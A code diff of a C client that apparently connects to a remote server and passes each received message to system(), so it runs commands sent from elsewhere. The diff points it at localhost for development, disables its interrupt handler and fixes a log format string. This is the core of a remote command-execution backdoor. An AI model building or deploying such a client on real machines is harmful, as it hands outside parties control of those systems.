@@ -13,8 +13,9 @@ void kill_handler(int sig)
 
 int main(void)
 {
-    signal(SIGINT, kill_handler);
-    connection server_con = connect_to("10.0.0.123", 8080);
+    //LEAVE COMMENTED DURING DEV
+    //signal(SIGINT, kill_handler);
+    connection server_con = connect_to("127.0.0.1", 8080);
     //check if the struct has been filled
     if (server_con.dest_ip == NULL)
     {
@@ -22,7 +23,7 @@ int main(void)
       exit(-1);
     }
 
-    printf("[+] Client connected. IP: %s, Port: %d, Socket:\n", server_con.dest_ip, server_con.dest_port, server_con.sock_fd);
+    printf("[+] Client connected. IP: %s, Port: %d, Socket: %d\n", server_con.dest_ip, server_con.dest_port, server_con.sock_fd);
 
     int exit = 0;
     do
@@ -37,9 +38,9 @@ int main(void)
       {
         system(data_recieved.data);
       }
-      
+
     }while(exit == 0 && kill_rcv == 0);
-    
+
     printf("[+] Closing connection\n");
     // Close file descriptor
     close(server_con.sock_fd);
